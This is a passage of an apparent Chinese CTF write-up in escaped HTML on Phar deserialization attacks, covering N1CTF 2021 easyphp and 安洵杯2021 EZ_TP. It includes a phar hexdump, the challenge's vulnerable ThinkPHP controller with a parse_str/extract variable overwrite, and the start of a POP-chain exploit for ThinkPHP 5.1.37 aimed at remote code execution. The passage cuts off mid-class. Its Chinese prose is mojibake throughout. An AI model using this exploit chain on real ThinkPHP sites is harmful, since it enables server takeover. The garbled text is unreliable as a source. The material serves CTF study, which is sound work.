·ï¼ˆçœ‹ä¸ªå¼€å¤´å°±è¡Œï¼‰&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;00000000: 5469 6d65 3a20 3230 3231 2d31 312d 3232  Time: 2021-11-22&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;00000010: 2030 363a 3533 3a31 3520 4950 3a20 5b5d   06:53:15 IP: []&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;00000020: 2c20 5245 5155 4553 543a 205b 5d2c 2043  , REQUEST: [], C&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;00000030: 4f4e 5445 4e54 3a20 5b5f 5f5f 5f5f 5f5f  ONTENT: [_______&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;00000040: 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f  ________________&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;00000050: 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f  ________________&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;00000060: 5f5f 5f5f 3030 3030 3634 3400 0000 0000  ____0000644.....&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;00000070: 0000 0000 0000 0000 0000 0000 3030 3030  ............0000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;00000080: 3030 3030 3032 3400 3134 3134 3636 3337  0000024.14146637&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;00000090: 3133 3300 3030 3233 3534 3320 3000 0000  133.0023543 0...&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;000000a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;ä¸åªæ˜¯tarï¼Œè¿˜æœ‰åˆ«çš„æ ¼å¼ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&amp;%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/targz.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;&lt;a href=&#34;https://www.php.net/manual/zh/phar.converttoexecutable.php&#34;&gt;https://www.php.net/manual/zh/phar.converttoexecutable.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å¯¹åº”çš„ä»£ç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;convertToExecutable&lt;/span&gt;(&lt;span class=&#34;title class_&#34;&gt;Phar&lt;/span&gt;::&lt;span class=&#34;variable constant_&#34;&gt;TAR&lt;/span&gt;,&lt;span class=&#34;title class_&#34;&gt;Phar&lt;/span&gt;::&lt;span class=&#34;variable constant_&#34;&gt;BZ2&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//ä¼šç”Ÿæˆxxxx.phar.tar.bz2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;convertToExecutable&lt;/span&gt;(&lt;span class=&#34;title class_&#34;&gt;Phar&lt;/span&gt;::&lt;span class=&#34;variable constant_&#34;&gt;TAR&lt;/span&gt;,&lt;span class=&#34;title class_&#34;&gt;Phar&lt;/span&gt;::&lt;span class=&#34;variable constant_&#34;&gt;GZ&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//ä¼šç”Ÿæˆxxxx.phar.tar.gz&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;convertToExecutable&lt;/span&gt;(&lt;span class=&#34;title class_&#34;&gt;Phar&lt;/span&gt;::&lt;span class=&#34;variable constant_&#34;&gt;ZIP&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//ä¼šç”Ÿæˆxxxx.phar.zip&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;hr&gt;
&lt;h3 id=&#34;POPé“¾&#34;&gt;&lt;a href=&#34;#POPé“¾&#34; class=&#34;headerlink&#34; title=&#34;POPé“¾&#34;&gt;&lt;/a&gt;&lt;strong&gt;POPé“¾&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;POP(property oriented programming)ï¼Œè¯´ç™½äº†å°±æ˜¯ç»è¿‡ä¸€è¿ä¸²çš„é­”æœ¯æ–¹æ³•&amp;#x2F;ç‰¹æ®Šæ–¹æ³•è°ƒç”¨è¾¾åˆ°ç‰¹å®šç›®çš„çš„ä¸€ç§æ”»å‡»æ–¹å¼ï¼Œæœ¬è´¨æ˜¯é€šè¿‡åœ¨è°ƒç”¨è¿™äº›æ–¹æ³•çš„è¿‡ç¨‹ä¸­åˆè§¦å‘äº†åˆ«çš„ç‰¹æ®Šæ–¹æ³•ï¼Œå¼•å‘è¿é”ååº”ç›´åˆ°è§¦åŠç›®æ ‡ã€‚pharååºåˆ—åŒ–ä½¿å¾—ä¸å­˜åœ¨unserilizeå‡½æ•°æ—¶è¿™æ ·çš„æ”»å‡»ä¹Ÿèƒ½æˆåŠŸï¼Œè¿™æ­£æ˜¯æ‰€è°“â€œæ‰©å¤§æ”»å‡»é¢â€ã€‚æˆ‘ä»¬ä»¥åˆšåˆšç»“æŸçš„å®‰æ´µæ¯2021 EZ_TPä¸ºä¾‹å­ã€‚&lt;/p&gt;
&lt;p&gt;ç½‘ç«™ä½¿ç”¨ThinkPHP V5.1.37ï¼Œç½‘ä¸Šå·²æœ‰ç°æˆçš„&lt;a href=&#34;https://blog.csdn.net/lllffg/article/details/116145918&#34;&gt;POPé“¾&lt;/a&gt;ï¼Œç°åœ¨éœ€è¦æˆ‘ä»¬åœ¨æ²¡æœ‰unserilizeå‡½æ•°çš„æƒ…å†µä¸‹å®Œæˆååºåˆ—åŒ–æ”»å‡»ã€‚&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;app&lt;/span&gt;\&lt;span class=&#34;title class_&#34;&gt;index&lt;/span&gt;\&lt;span class=&#34;title class_&#34;&gt;controller&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;use&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;think&lt;/span&gt;\&lt;span class=&#34;title&#34;&gt;Controller&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Index&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;controller&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;index&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;style type=&amp;quot;text/css&amp;quot;&amp;gt;*&amp;#123; padding: 0; margin: 0; &amp;#125; div&amp;#123; padding: 4px 48px;&amp;#125; a&amp;#123;color:#2E5CD5;cursor: pointer;text-decoration: none&amp;#125; a:hover&amp;#123;text-decoration:underline; &amp;#125; body&amp;#123; background: #fff; font-family: &amp;quot;Century Gothic&amp;quot;,&amp;quot;Microsoft yahei&amp;quot;; color: #333;font-size:18px;&amp;#125; h1&amp;#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &amp;#125; p&amp;#123; line-height: 1.6em; font-size: 42px &amp;#125;&amp;lt;/style&amp;gt;&amp;lt;div style=&amp;quot;padding: 24px 48px;&amp;quot;&amp;gt; &amp;lt;h1&amp;gt;:) &amp;lt;/h1&amp;gt;&amp;lt;p&amp;gt; ThinkPHP V5.1&amp;lt;br/&amp;gt;&amp;lt;span style=&amp;quot;font-size:30px&amp;quot;&amp;gt;12è½½åˆå¿ƒä¸æ”¹ï¼ˆ2006-2018ï¼‰ - ä½ å€¼å¾—ä¿¡èµ–çš„PHPæ¡†æ¶&amp;lt;/span&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;script type=&amp;quot;text/javascript&amp;quot; src=&amp;quot;https://tajs.qq.com/stats?sId=64890268&amp;quot; charset=&amp;quot;UTF-8&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script type=&amp;quot;text/javascript&amp;quot; src=&amp;quot;https://e.topthink.com/Public/static/client.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;think id=&amp;quot;eab4b9f840753f8e7&amp;quot;&amp;gt;&amp;lt;/think&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;hello&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;title function_ invoke__&#34;&gt;highlight_file&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$hello&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;base64_encode&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Welcome to D0g3&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;hello&amp;#x27;&lt;/span&gt;])||&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;hello&amp;#x27;&lt;/span&gt;])) &lt;span class=&#34;keyword&#34;&gt;exit&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;world&amp;#x27;&lt;/span&gt;]))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;title function_ invoke__&#34;&gt;parse_str&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;world&amp;#x27;&lt;/span&gt;],&lt;span class=&#34;variable&#34;&gt;$haha&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;title function_ invoke__&#34;&gt;extract&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$haha&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;hello.txt&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$s&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;base64_decode&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$hello&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;title function_ invoke__&#34;&gt;file_put_contents&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;hello.txt&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$s&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; (&lt;span class=&#34;title function_ invoke__&#34;&gt;file_get_contents&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;parse_str()å’Œextract()ä½¿å¾—æˆ‘ä»¬å¯ä»¥é€šè¿‡å˜é‡è¦†ç›–å®Œæˆæ–‡ä»¶å†™å…¥ä¸ä»»æ„è¯»å–ï¼Œå¹¶ä¸”$aå¯ä»¥ä½¿ç”¨ä¼ªåè®®ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥çš„äº‹æƒ…å°±ç†æ‰€åº”å½“äº†ï¼šå¾€hello.txté‡Œå†™å…¥ä¸€ä¸ªpharï¼Œmetadataé‡Œé¢æ”¾ThinkPHP 5.1.37 çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Œå®ŒæˆRCE.(å…³äºè¿™ä¸ªPOPé“¾çš„åŸç†è¯·å‚é˜…&lt;a href=&#34;https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp-5.1.37-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html&#34;&gt;https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-ååºåˆ—åŒ–æ¼æ´/Thinkphp-5.1.37-ååºåˆ—åŒ–æ¼æ´.html&lt;/a&gt; è®²çš„å¾ˆè¯¦ç»†)&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;think&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title class_&#34;&gt;abstract&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Model&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;title class_&#34;&gt;protected&lt;/span&gt; $&lt;span class=&#34;title class_&#34;&gt;append&lt;/span&gt; = [];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$data&lt;/span&gt; = [];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;append = [&lt;span class=&#34;string&#34;&gt;&amp;quot;ethan&amp;quot;&lt;/span&gt;=&amp;gt;[&lt;span class=&#34;string&#34;&gt;&amp;quot;godspeedyyds&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;xtxyyds&amp;quot;&lt;/span&gt;]];&lt;/span&gt;&lt;br&gt;&lt;span 